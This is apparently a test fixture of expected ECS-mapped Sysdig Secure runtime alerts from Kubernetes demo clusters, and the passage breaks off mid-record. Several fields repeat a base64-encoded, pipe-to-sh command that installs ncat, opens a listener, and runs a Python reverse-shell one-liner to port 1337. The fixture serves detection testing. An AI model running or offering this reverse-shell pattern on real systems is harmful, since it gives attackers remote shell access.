{
    "expected": [
        {
            "@timestamp": "2025-04-16T03:01:01.1951498Z",
            "cloud": {
                "account": {
                    "id": "123456789012"
                },
                "project": {
                    "id": "1231456789012"
                },
                "provider": "gcp",
                "region": "us-central1"
            },
            "container": {
                "image": {
                    "hash": {
                        "all": [
                            "sha256:aa7b73608abcfb0212401234567890123456789abcdefa610681097a54ca2c2a"
                        ]
                    },
                    "name": "docker.io/library/python"
                },
                "name": "shell-scripting"
            },
            "ecs": {
                "version": "8.11.0"
            },
            "event": {
                "category": [
                    "process"
                ],
                "id": "1a33f0946dabcdefabcdefad5c3e7f22",
                "kind": "event",
                "original": "{\"category\":\"runtime\",\"content\":{\"fields\":{\"container.image.repository\":\"docker.io/library/python\",\"container.name\":\"shell-scripting\",\"evt.res\":\"SUCCESS\",\"evt.type\":\"execve\",\"group.gid\":\"0\",\"group.name\":\"root\",\"proc.args\":\"\",\"proc.cmdline\":\"sh\",\"proc.cwd\":\"/\",\"proc.exepath\":\"/usr/bin/dash\",\"proc.hash.sha256\":\"f5adb8bf0100ed0f8c7782ca5f92814e9229525a4b4e0d401cf3bea09ac960a6\",\"proc.name\":\"sh\",\"proc.pcmdline\":\"bash -c echo IyEvYmluL2Jhc2gKYXB0IHVwZGF0ZSAteTsgYXB0IGluc3RhbGwgLXkgbmNhdApuYyAtbHYgMTMzNyAmCg== | base64 -d | sh; echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMC4wLjAuMCIsMTMzNykpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bihbInNoIiwgIi1jIiwgInNsZWVwIDU7bHMgLWE7IGV4aXQgMCJdKScK | base64 -d | sh\",\"proc.pid\":\"1890726\",\"proc.pid.ts\":\"1744002001003626585\",\"proc.pname\":\"bash\",\"proc.ppid\":\"1890704\",\"proc.ppid.ts\":\"1744002000895807711\",\"proc.sid\":\"1\",\"user.loginname\":\"<NA>\",\"user.loginuid\":\"-1\",\"user.name\":\"root\",\"user.uid\":\"0\"},\"origin\":\"Secure UI\",\"output\":\"Custom rule. The shell-scripting with image docker.io/library/python by parent bash under user root (proc.name=sh proc.exepath-custom=/usr/bin/dash proc.pname=bash gparent=containerd-shim ggparent=<NA> gggparent=<NA> image=docker.io/library/python user.uid=0 proc.cmdline=sh proc.pcmdline=bash -c echo IyEvYmluL2Jhc2gKYXB0IHVwZGF0ZSAteTsgYXB0IGluc3RhbGwgLXkgbmNhdApuYyAtbHYgMTMzNyAmCg== | base64 -d | sh; echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMC4wLjAuMCIsMTMzNykpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bihbInNoIiwgIi1jIiwgInNsZWVwIDU7bHMgLWE7IGV4aXQgMCJdKScK | base64 -d | sh user.name=root user.loginuid=-1 proc.args= container.name=shell-scripting evt.type=execve evt.res=SUCCESS proc.pid=1890726 proc.cwd=/ proc.ppid=1890704 proc.sid=1 proc.exepath=/usr/bin/dash user.loginname=<NA> group.gid=0 group.name=root proc.pid.ts=1744002001003626585 proc.ppid.ts=1744002000895807711 proc.hash.sha256=f5adb8bf0100ed0f8c7782ca5f92814e9229525a4b4e0d401cf3bea09ac960a6)\",\"policyId\":10569534,\"ruleName\":\"My test rule custom\",\"ruleSubType\":0,\"ruleTags\":[\"My-tag-custom-1-hello-world\",\"MITTRE-WHATEVER\"],\"ruleType\":6,\"type\":\"workloadRuntimeDetection\"},\"description\":\"This is just a dumb policy to test custom policies\",\"engine\":\"falco\",\"id\":\"1a33f0946dabcdefabcdefad5c3e7f22\",\"labels\":{\"cloudProvider.account.id\":\"123456789012\",\"cloudProvider.name\":\"gcp\",\"cloudProvider.region\":\"us-central1\",\"container.image.digest\":\"sha256:aa7b73608abcfb0212401234567890123456789abcdefa610681097a54ca2c2a\",\"container.image.id\":\"ef0abcdefbd2\",\"container.image.repo\":\"docker.io/library/python\",\"container.image.tag\":\"3.9.18-slim\",\"container.label.io.kubernetes.container.name\":\"shell-scripting\",\"container.label.io.kubernetes.pod.name\":\"shell-scripting-abcdef12-12345\",\"container.label.io.kubernetes.pod.namespace\":\"default\",\"container.name\":\"shell-scripting\",\"gcp.location\":\"us-central1\",\"gcp.projectId\":\"1231456789012\",\"host.hostName\":\"gke-cluster-gcp-demo-san-default-pool-11234abc-abcd\",\"host.mac\":\"01:00:5e:90:10:00\",\"kubernetes.cluster.name\":\"gke-alliances-demo-6\",\"kubernetes.cronJob.name\":\"shell-scripting\",\"kubernetes.job.name\":\"shell-scripting-29066700\",\"kubernetes.namespace.name\":\"default\",\"kubernetes.node.name\":\"gke-cluster-gcp-demo-san-default-pool-11234abc-abcd\",\"kubernetes.pod.name\":\"shell-scripting-abcdef12-12345\",\"kubernetes.workload.name\":\"shell-scripting\",\"kubernetes.workload.type\":\"cronjob\"},\"name\":\"Manuel test policy\",\"originator\":\"policy\",\"rawEventCategory\":\"runtime\",\"rawEventOriginator\":\"linuxAgent\",\"severity\":4,\"source\":\"syscall\",\"sourceDetails\":{\"subType\":\"container\",\"type\":\"workload\"},\"timestamp\":1744772461195149800}",
                "outcome": "success",
                "provider": "syscall",
                "severity": 4,
                "type": [
                    "info"
                ]
            },
            "host": {
                "hostname": "gke-cluster-gcp-demo-san-default-pool-11234abc-abcd",
                "mac": [
                    "01-00-5E-90-10-00"
                ],
                "name": "gke-cluster-gcp-demo-san-default-pool-11234abc-abcd"
            },
            "message": "Custom rule. The shell-scripting with image docker.io/library/python by parent bash under user root (proc.name=sh proc.exepath-custom=/usr/bin/dash proc.pname=bash gparent=containerd-shim ggparent=<NA> gggparent=<NA> image=docker.io/library/python user.uid=0 proc.cmdline=sh proc.pcmdline=bash -c echo IyEvYmluL2Jhc2gKYXB0IHVwZGF0ZSAteTsgYXB0IGluc3RhbGwgLXkgbmNhdApuYyAtbHYgMTMzNyAmCg== | base64 -d | sh; echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMC4wLjAuMCIsMTMzNykpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bihbInNoIiwgIi1jIiwgInNsZWVwIDU7bHMgLWE7IGV4aXQgMCJdKScK | base64 -d | sh user.name=root user.loginuid=-1 proc.args= container.name=shell-scripting evt.type=execve evt.res=SUCCESS proc.pid=1890726 proc.cwd=/ proc.ppid=1890704 proc.sid=1 proc.exepath=/usr/bin/dash user.loginname=<NA> group.gid=0 group.name=root proc.pid.ts=1744002001003626585 proc.ppid.ts=1744002000895807711 proc.hash.sha256=f5adb8bf0100ed0f8c7782ca5f92814e9229525a4b4e0d401cf3bea09ac960a6)",
            "observer": {
                "product": "Sysdig Secure",
                "vendor": "Sysdig"
            },
            "orchestrator": {
                "cluster": {
                    "name": "gke-alliances-demo-6"
                },
                "namespace": "default",
                "resource": {
                    "name": "shell-scripting-abcdef12-12345",
                    "parent": {
                        "type": "cronjob"
                    }
                }
            },
            "process": {
                "command_line": "sh",
                "executable": "/usr/bin/dash",
                "hash": {
                    "sha256": "f5adb8bf0100ed0f8c7782ca5f92814e9229525a4b4e0d401cf3bea09ac960a6"
                },
                "name": "sh",
                "parent": {
                    "command_line": "bash -c echo IyEvYmluL2Jhc2gKYXB0IHVwZGF0ZSAteTsgYXB0IGluc3RhbGwgLXkgbmNhdApuYyAtbHYgMTMzNyAmCg== | base64 -d | sh; echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMC4wLjAuMCIsMTMzNykpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bihbInNoIiwgIi1jIiwgInNsZWVwIDU7bHMgLWE7IGV4aXQgMCJdKScK | base64 -d | sh",
                    "name": "bash",
                    "pid": 1890704,
                    "start": "2025-04-07T05:00:00.895807711Z"
                },
                "pid": 1890726,
                "start": "2025-04-07T05:00:01.003626585Z",
                "working_directory": "/"
            },
            "related": {
                "hash": [
                    "f5adb8bf0100ed0f8c7782ca5f92814e9229525a4b4e0d401cf3bea09ac960a6",
                    "aa7b73608abcfb0212401234567890123456789abcdefa610681097a54ca2c2a"
                ],
                "hosts": [
                    "gke-cluster-gcp-demo-san-default-pool-11234abc-abcd"
                ],
                "user": [
                    "root",
                    "0"
                ]
            },
            "rule": {
                "description": "This is just a dumb policy to test custom policies",
                "name": "My test rule custom",
                "ruleset": "Manuel test policy"
            },
            "sysdig": {
                "event": {
                    "category": "runtime",
                    "content": {
                        "fields": {
                            "container": {
                                "image": {
                                    "repository": "docker.io/library/python"
                                },
                                "name": "shell-scripting"
                            },
                            "evt": {
                                "res": "SUCCESS",
                                "type": "execve"
                            },
                            "group": {
                                "gid": "0",
                                "name": "root"
                            },
                            "proc": {
                                "cmdline": "sh",
                                "cwd": "/",
                                "exepath": "/usr/bin/dash",
                                "hash": {
                                    "sha256": "f5adb8bf0100ed0f8c7782ca5f92814e9229525a4b4e0d401cf3bea09ac960a6"
                                },
                                "name": "sh",
                                "pcmdline": "bash -c echo IyEvYmluL2Jhc2gKYXB0IHVwZGF0ZSAteTsgYXB0IGluc3RhbGwgLXkgbmNhdApuYyAtbHYgMTMzNyAmCg== | base64 -d | sh; echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMC4wLjAuMCIsMTMzNykpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bihbInNoIiwgIi1jIiwgInNsZWVwIDU7bHMgLWE7IGV4aXQgMCJdKScK | base64 -d | sh",
                                "pid": 1890726,
                                "pid_ts": "2025-04-07T05:00:01.003626585Z",
                                "pname": "bash",
                                "ppid": 1890704,
                                "ppid_ts": "2025-04-07T05:00:00.895807711Z",
                                "sid": "1"
                            },
                            "user": {
                                "name": "root",
                                "uid": "0"
                            }
                        },
                        "origin": "Secure UI",
                        "output": "Custom rule. The shell-scripting with image docker.io/library/python by parent bash under user root (proc.name=sh proc.exepath-custom=/usr/bin/dash proc.pname=bash gparent=containerd-shim ggparent=<NA> gggparent=<NA> image=docker.io/library/python user.uid=0 proc.cmdline=sh proc.pcmdline=bash -c echo IyEvYmluL2Jhc2gKYXB0IHVwZGF0ZSAteTsgYXB0IGluc3RhbGwgLXkgbmNhdApuYyAtbHYgMTMzNyAmCg== | base64 -d | sh; echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMC4wLjAuMCIsMTMzNykpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bihbInNoIiwgIi1jIiwgInNsZWVwIDU7bHMgLWE7IGV4aXQgMCJdKScK | base64 -d | sh user.name=root user.loginuid=-1 proc.args= container.name=shell-scripting evt.type=execve evt.res=SUCCESS proc.pid=1890726 proc.cwd=/ proc.ppid=1890704 proc.sid=1 proc.exepath=/usr/bin/dash user.loginname=<NA> group.gid=0 group.name=root proc.pid.ts=1744002001003626585 proc.ppid.ts=1744002000895807711 proc.hash.sha256=f5adb8bf0100ed0f8c7782ca5f92814e9229525a4b4e0d401cf3bea09ac960a6)",
                        "policy_id": "10569534",
                        "rule_name": "My test rule custom",
                        "rule_sub_type": 0,
                        "rule_tags": [
                            "My-tag-custom-1-hello-world",
                            "MITTRE-WHATEVER"
                        ],
                        "rule_type": 6,
                        "type": "workloadRuntimeDetection"
                    },
                    "description": "This is just a dumb policy to test custom policies",
                    "engine": "falco",
                    "id": "1a33f0946dabcdefabcdefad5c3e7f22",
                    "labels": {
                        "cloud_provider": {
                            "account": {
                                "id": "123456789012"
                            },
                            "name": "gcp",
                            "region": "us-central1"
                        },
                        "container": {
                            "image": {
                                "digest": "sha256:aa7b73608abcfb0212401234567890123456789abcdefa610681097a54ca2c2a",
                                "id": "ef0abcdefbd2",
                                "repo": "docker.io/library/python",
                                "tag": "3.9.18-slim"
                            },
                            "label": {
                                "io": {
                                    "kubernetes": {
                                        "container": {
                                            "name": "shell-scripting"
                                        },
                                        "pod": {
                                            "name": "shell-scripting-abcdef12-12345",
                                            "namespace": "default"
                                        }
                                    }
                                }
                            },
                            "name": "shell-scripting"
                        },
                        "gcp": {
                            "location": "us-central1",
                            "project_id": "1231456789012"
                        },
                        "host": {
                            "host_name": "gke-cluster-gcp-demo-san-default-pool-11234abc-abcd",
                            "mac": "01-00-5E-90-10-00"
                        },
                        "kubernetes": {
                            "cluster": {
                                "name": "gke-alliances-demo-6"
                            },
                            "cron_job": {
                                "name": "shell-scripting"
                            },
                            "job": {
                                "name": "shell-scripting-29066700"
                            },
                            "namespace": {
                                "name": "default"
                            },
                            "node": {
                                "name": "gke-cluster-gcp-demo-san-default-pool-11234abc-abcd"
                            },
                            "pod": {
                                "name": "shell-scripting-abcdef12-12345"
                            },
                            "workload": {
                                "name": "shell-scripting",
                                "type": "cronjob"
                            }
                        }
                    },
                    "name": "Manuel test policy",
                    "originator": "policy",
                    "raw_event_category": "runtime",
                    "raw_event_originator": "linuxAgent",
                    "severity": 4,
                    "severity_value": "Medium",
                    "source": "syscall",
                    "source_details": {
                        "sub_type": "container",
                        "type": "workload"
                    },
                    "timestamp": "2025-04-16T03:01:01.1951498Z"
                }
            },
            "tags": [
                "preserve_duplicate_custom_fields"
            ],
            "user": {
                "group": {
                    "id": "0",
                    "name": "root"
                },
                "id": "0",
                "name": "root"
            }
        },
        {
            "@timestamp": "2025-04-15T00:10:45.3285942Z",
            "cloud": {
                "account": {
                    "id": "012345678912"
                },
                "provider": "aws",
                "region": "us-west-2"
            },
            "container": {
                "id": "d2abcdefa588",
                "image": {
                    "hash": {
                        "all": [
                            "sha256:b6980881cf440a3ae78dfa9c021aaa9bb66fc3c27b7120cfa2b2fa1c35ceaa20"
                        ]
                    },
                    "name": "docker.io/alpine/k8s"
                },
                "name": "test-aqua-enforcer"
            },
            "ecs": {
                "version": "8.11.0"
            },
            "event": {
                "category": [
                    "process"
                ],
                "id": "183abcdefabcdef123456ffcccf0a338",
                "kind": "event",
                "original": "{\"actions\":[{\"afterEventNs\":30000000000,\"beforeEventNs\":15000000000,\"isSuccessful\":true,\"token\":\"0d0eefe8-a14b-1234-5678-abcdef7c4ce4\",\"type\":\"capture\"}],\"category\":\"runtime\",\"content\":{\"fields\":{\"container.id\":\"d2abcdefa588\",\"container.image.repository\":\"docker.io/alpine/k8s\",\"container.name\":\"test-aqua-enforcer\",\"evt.arg.path\":\"<NA>\",\"evt.type\":\"open\",\"fd.name\":\"/var/log/enforcer_testjob.log\",\"group.gid\":\"0\",\"group.name\":\"root\",\"proc.cmdline\":\"bash -c echo \\\"Checking Aqua Enforcer\\\"; sleep 5; timeout_seconds=420;  retry_interval=30;  max_retry_attempts=5;  start_time=$(date +%s); aqua_enforcer_pods=($(kubectl get pods -n aqua -l app=aqua-enforcer-ds --field-selector=status.phase==Running -o jsonpath=\\\"{.items[*].metadata.name}\\\"));.for aqua_enforcer_pod in \\\"${aqua_enforcer_pods[@]}\\\"; do..    while true; do.        current_time=$(date +%s); elapsed_time=$((current_time - start_time));..        if [ $elapsed_time -ge $timeout_seconds ]; then.            echo \\\"Error: Timeout reached while waiting for Aqua Enforcer pods to be ready.\\\";.            exit 1;.        fi;..        aqua_enforcer_pod_status=$(kubectl get pod $aqua_enforcer_pod -n aqua -o jsonpath=\\\"{.status.phase}\\\");..        if [[ $aqua_enforcer_pod_status != \\\"Running\\\" ]]; then.            echo \\\"LOG: Pod $aqua_enforcer_pod, $aqua_enforcer_pod_status\\\";.            sleep 15;.        else.            echo \\\"LOG: Pod $aqua_enforcer_pod, Running\\\";.            break;.        fi;.    done;.done;.for aqua_enforcer_pod in \\\"${aqua_enforcer_pods[@]}\\\"; do..    kubectl exec -n aqua $aqua_enforcer_pod -- timeout 30s /opt/aquasec/./slkaudit > /var/log/enforcer_testjob.log 2>&1.    grep -iq \\\"Successfully connected to gateway\\\" /var/log/enforcer_testjob.log.    grep_exit_code=$?;..    if [ $grep_exit_code -eq 0 ]; then.        echo \\\"Success: Aqua Enforcer pod $aqua_enforcer_pod is running and connected\\\";.    else.        echo \\\"Error: Aqua Enforcer pod $aqua_enforcer_pod failed to connect.\\\";.        echo \\\"Retrying for 5 minutes.\\\";..        start_time_retry=$(date +%s); retry_elapsed_time=0;..        while [ $retry_elapsed_time -lt $((retry_interval * max_retry_attempts)) ]; do.            kubectl exec -n aqua $aqua_enforcer_pod -- timeout 30s /opt/aquasec/./slkaudit > /var/log/enforcer_testjob.log 2>&1.            grep -iq \\\"Successfully connected to gateway\\\" /var/log/enforcer_testjob.log.            grep_exit_code=$?;..            if [ $grep_exit_code -eq 0 ]; then.                echo \\\"Success: Aqua Enforcer pod $aqua_enforcer_pod is running and connected after retry.\\\";.                break;.            else.                echo \\\"Retry: Aqua Enforcer pod $aqua_enforcer_pod failed to connect. Retrying in 30 seconds.\\\";.                sleep $retry_interval;.                retry_elapsed_time=$((retry_elapsed_time + retry_interval));.            fi;.        done;..        if [ $grep_exit_code -ne 0 ]; then.            echo \\\"Error: Retry limit reached. Aqua Enforcer pod $aqua_enforcer_pod still failed to connect.\\\";.            exit 1;.        fi;.    fi;.done;.echo \\\"Job completed successfully for all Aqua Enforcer pods.\\\"; exit 0;\",\"proc.cwd\":\"/apps/\",\"proc.exepath\":\"/bin/bash\",\"proc.name\":\"bash\",\"proc.pcmdline\":\"bash -c echo \\\"Checking Aqua Enforcer\\\"; sleep 5; timeout_seconds=420;  retry_interval=30;  max_retry_attempts=5;  start_time=$(date +%s); aqua_enforcer_pods=($(kubectl get pods -n aqua -l app=aqua-enforcer-ds --field-selector=status.phase==Running -o jsonpath=\\\"{.items[*].metadata.name}\\\"));.for aqua_enforcer_pod in \\\"${aqua_enforcer_pods[@]}\\\"; do..    while true; do.        current_time=$(date +%s); elapsed_time=$((current_time - start_time));..        if [ $elapsed_time -ge $timeout_seconds ]; then.            echo \\\"Error: Timeout reached while waiting for Aqua Enforcer pods to be ready.\\\";.            exit 1;.        fi;..        aqua_enforcer_pod_status=$(kubectl get pod $aqua_enforcer_pod -n aqua -o jsonpath=\\\"{.status.phase}\\\");..        if [[ $aqua_enforcer_pod_status != \\\"Running\\\" ]]; then.            echo \\\"LOG: Pod $aqua_enforcer_pod, $aqua_enforcer_pod_status\\\";.            sleep 15;.        else.            echo \\\"LOG: Pod $aqua_enforcer_pod, Running\\\";.            break;.        fi;.    done;.done;.for aqua_enforcer_pod in \\\"${aqua_enforcer_pods[@]}\\\"; do..    kubectl exec -n aqua $aqua_enforcer_pod -- timeout 30s /opt/aquasec/./slkaudit > /var/log/enforcer_testjob.log 2>&1.    grep -iq \\\"Successfully connected to gateway\\\" /var/log/enforcer_testjob.log.    grep_exit_code=$?;..    if [ $grep_exit_code -eq 0 ]; then.        echo \\\"Success: Aqua Enforcer pod $aqua_enforcer_pod is running and connected\\\";.    else.        echo \\\"Error: Aqua Enforcer pod $aqua_enforcer_pod failed to connect.\\\";.        echo \\\"Retrying for 5 minutes.\\\";..        start_time_retry=$(date +%s); retry_elapsed_time=0;..        while [ $retry_elapsed_time -lt $((retry_interval * max_retry_attempts)) ]; do.            kubectl exec -n aqua $aqua_enforcer_pod -- timeout 30s /opt/aquasec/./slkaudit > /var/log/enforcer_testjob.log 2>&1.            grep -iq \\\"Successfully connected to gateway\\\" /var/log/enforcer_testjob.log.            grep_exit_code=$?;..            if [ $grep_exit_code -eq 0 ]; then.                echo \\\"Success: Aqua Enforcer pod $aqua_enforcer_pod is running and connected after retry.\\\";.                break;.            else.                echo \\\"Retry: Aqua Enforcer pod $aqua_enforcer_pod failed to connect. Retrying in 30 seconds.\\\";.                sleep $retry_interval;.                retry_elapsed_time=$((retry_elapsed_time + retry_interval));.            fi;.        done;..        if [ $grep_exit_code -ne 0 ]; then.            echo \\\"Error: Retry limit reached. Aqua Enforcer pod $aqua_enforcer_pod still failed to connect.\\\";.            exit 1;.        fi;.    fi;.done;.echo \\\"Job completed successfully for all Aqua Enforcer pods.\\\"; exit 0;\",\"proc.pid\":\"146490\",\"proc.pname\":\"bash\",\"proc.ppid\":\"136656\",\"proc.sid\":\"1\",\"user.loginname\":\"<NA>\",\"user.loginuid\":\"-1\",\"user.name\":\"root\",\"user.uid\":\"0\"},\"origin\":\"Sysdig\",\"output\":\"Log files tampered by bash with parent bash on test-aqua-enforcer under user root (evt.type=open fd.name=/var/log/enforcer_testjob.log evt.arg.path=<NA> evt.arg.name=/var/log/enforcer_testjob.log proc.exepath=/bin/bash proc.name=bash proc.pname=bash gparent=containerd-shim ggparent=systemd gggparent=<NA> image=docker.io/alpine/k8s user.name=root user.loginuid=-1 proc.cmdline=bash -c echo \\\"Checking Aqua Enforcer\\\"; sleep 5; timeout_seconds=420;  retry_interval=30;  max_retry_attempts=5;  start_time=$(date +%s); aqua_enforcer_pods=($(kubectl get pods -n aqua -l app=aqua-enforcer-ds --field-selector=status.phase==Running -o jsonpath=\\\"{.items[*].metadata.name}\\\"));.for aqua_enforcer_pod in \\\"${aqua_enforcer_pods[@]}\\\"; do..    while true; do.        current_time=$(date +%s); elapsed_time=$((current_time - start_time));..        if [ $elapsed_time -ge $timeout_seconds ]; then.            echo \\\"Error: Timeout reached while waiting for Aqua Enforcer pods to be ready.\\\";.            exit 1;.        fi;..        aqua_enforcer_pod_status=$(kubectl get pod $aqua_enforcer_pod -n aqua -o jsonpath=\\\"{.status.phase}\\\");..        if [[ $aqua_enforcer_pod_status != \\\"Running\\\" ]]; then.            echo \\\"LOG: Pod $aqua_enforcer_pod, $aqua_enforcer_pod_status\\\";.            sleep 15;.        else.            echo \\\"LOG: Pod $aqua_enforcer_pod, Running\\\";.            break;.        fi;.    done;.done;.for aqua_enforcer_pod in \\\"${aqua_enforcer_pods[@]}\\\"; do..    kubectl exec -n aqua $aqua_enforcer_pod -- timeout 30s /opt/aquasec/./slkaudit > /var/log/enforcer_testjob.log 2>&1.    grep -iq \\\"Successfully connected to gateway\\\" /var/log/enforcer_testjob.log.    grep_exit_code=$?;..    if [ $grep_exit_code -eq 0 ]; then.        echo \\\"Success: Aqua Enforcer pod $aqua_enforcer_pod is running and connected\\\";.    else.        echo \\\"Error: Aqua Enforcer pod $aqua_enforcer_pod failed to connect.\\\";.        echo \\\"Retrying for 5 minutes.\\\";..        start_time_retry=$(date +%s); retry_elapsed_time=0;..        while [ $retry_elapsed_time -lt $((retry_interval * max_retry_attempts)) ]; do.            kubectl exec -n aqua $aqua_enforcer_pod -- timeout 30s /opt/aquasec/./slkaudit > /var/log/enforcer_testjob.log 2>&1.            grep -iq \\\"Successfully connected to gateway\\\" /var/log/enforcer_testjob.log.            grep_exit_code=$?;..            if [ $grep_exit_code -eq 0 ]; then.                echo \\\"Success: Aqua Enforcer pod $aqua_enforcer_pod is running and connected after retry.\\\";.                break;.            else.                echo \\\"Retry: Aqua Enforcer pod $aqua_enforcer_pod failed to connect. Retrying in 30 seconds.\\\";.                sleep $retry_interval;.                retry_elapsed_time=$((retry_elapsed_time + retry_interval));.            fi;.        done;..        if [ $grep_exit_code -ne 0 ]; then.            echo \\\"Error: Retry limit reached. Aqua Enforcer pod $aqua_enforcer_pod still failed to connect.\\\";.            exit 1;.        fi;.    fi;.done;.echo \\\"Job completed successfully for all Aqua Enforcer pods.\\\"; exit 0; container.id=d2c32629a588 proc.pid=146490 proc.cwd=/apps/ proc.ppid=136656 proc.pcmdline=bash -c echo \\\"Checking Aqua Enforcer\\\"; sleep 5; timeout_seconds=420;  retry_interval=30;  max_retry_attempts=5;  start_time=$(date +%s); aqua_enforcer_pods=($(kubectl get pods -n aqua -l app=aqua-enforcer-ds --field-selector=status.phase==Running -o jsonpath=\\\"{.items[*].metadata.name}\\\"));.for aqua_enforcer_pod in \\\"${aqua_enforcer_pods[@]}\\\"; do..    while true; do.        current_time=$(date +%s); elapsed_time=$((current_time - start_time));..        if [ $elapsed_time -ge $timeout_seconds ]; then.            echo \\\"Error: Timeout reached while waiting for Aqua Enforcer pods to be ready.\\\";.            exit 1;.        fi;..        aqua_enforcer_pod_status=$(kubectl get pod $aqua_enforcer_pod -n aqua -o jsonpath=\\\"{.status.phase}\\\");..        if [[ $aqua_enforcer_pod_status != \\\"Running\\\" ]]; then.            echo \\\"LOG: Pod $aqua_enforcer_pod, $aqua_enforcer_pod_status\\\";.            sleep 15;.        else.            echo \\\"LOG: Pod $aqua_enforcer_pod, Running\\\";.            break;.        fi;.    done;.done;.for aqua_enforcer_pod in \\\"${aqua_enforcer_pods[@]}\\\"; do..    kubectl exec -n aqua $aqua_enforcer_pod -- timeout 30s /opt/aquasec/./slkaudit > /var/log/enforcer_testjob.log 2>&1.    grep -iq \\\"Successfully connected to gateway\\\" /var/log/enforcer_testjob.log.    grep_exit_code=$?;..    if [ $grep_exit_code -eq 0 ]; then.        echo \\\"Success: Aqua Enforcer pod $aqua_enforcer_pod is running and connected\\\";.    else.        echo \\\"Error: Aqua Enforcer pod $aqua_enforcer_pod failed to connect.\\\";.        echo \\\"Retrying for 5 minutes.\\\";..        start_time_retry=$(date +%s); retry_elapsed_time=0;..        while [ $retry_elapsed_time -lt $((retry_interval * max_retry_attempts)) ]; do.            kubectl exec -n aqua $aqua_enforcer_pod -- timeout 30s /opt/aquasec/./slkaudit > /var/log/enforcer_testjob.log 2>&1.            grep -iq \\\"Successfully connected to gateway\\\" /var/log/enforcer_testjob.log.            grep_exit_code=$?;..            if [ $grep_exit_code -eq 0 ]; then.                echo \\\"Success: Aqua Enforcer pod $aqua_enforcer_pod is running and connected after retry.\\\";.                break;.            else.                echo \\\"Retry: Aqua Enforcer pod $aqua_enforcer_pod failed to connect. Retrying in 30 seconds.\\\";.                sleep $retry_interval;.                retry_elapsed_time=$((retry_elapsed_time + retry_interval));.            fi;.        done;..        if [ $grep_exit_code -ne 0 ]; then.            echo \\\"Error: Retry limit reached. Aqua Enforcer pod $aqua_enforcer_pod still failed to connect.\\\";.            exit 1;.        fi;.    fi;.done;.echo \\\"Job completed successfully for all Aqua Enforcer pods.\\\"; exit 0; proc.sid=1 user.uid=0 user.loginname=<NA> group.gid=0 group.name=root container.name=test-aqua-enforcer)\",\"policyId\":10011701,\"ruleName\":\"Clear Log Activities\",\"ruleSubType\":0,\"ruleTags\":[\"host\",\"container\",\"file\",\"FIM\",\"SOC2\",\"SOC2_CC6.7\",\"PCI\",\"PCI_DSS\",\"PCI_DSS_10.5.5\",\"NIST\",\"NIST_800-171\",\"NIST_800-171_3.14.6\",\"NIST_800-171_3.3.1\",\"NIST_800-171_3.3.2\",\"NIST_800-171_3.4.5\",\"NIST_800-53\",\"NIST_800-53_AU-6(8)\",\"NIST_800-53_CM-5\",\"NIST_800-53_AU-2\",\"NIST_800-53_AU-10\",\"FedRAMP\",\"FedRAMP_AU-10\",\"FedRAMP_AU-2\",\"ISO\",\"ISO_27001\",\"ISO_27001_A.18.1.3\",\"HIPAA\",\"HIPAA_164.308(a)\",\"HIPAA_164.312(b)\",\"HITRUST\",\"HITRUST_CSF\",\"HITRUST_CSF_01.p\",\"HITRUST_CSF_01.s\",\"HITRUST_CSF_06.i\",\"HITRUST_CSF_09.aa\",\"HITRUST_CSF_09.ab\",\"HITRUST_CSF_09.ad\",\"HITRUST_CSF_09.ae\",\"HITRUST_CSF_09.b\",\"HITRUST_CSF_09.x\",\"HITRUST_CSF_09.y\",\"HITRUST_CSF_10.d\",\"HITRUST_CSF_10.j\",\"HITRUST_CSF_10.k\",\"MITRE\",\"MITRE_TA0005_defense_evasion\",\"MITRE_TA0040_impact\",\"MITRE_T1070_indicator_removal_on_host\",\"MITRE_T1485_data_destruction\",\"MITRE_T1070.002_indicator_removal_clear_linux_or_mac_system_logs\",\"MITRE_T1070.003_indicator_removal_clear_command_history\",\"MITRE_T1070.004_indicator_removal_file_deletion\",\"oss\"],\"ruleType\":6,\"type\":\"workloadRuntimeDetection\"},\"description\":\"This Notable Events policy contains rules which may indicate undesired behavior including security threats. The rules are more generalized than Threat Detection policies and may result in more noise. Tuning will likely be required for the events generated from this 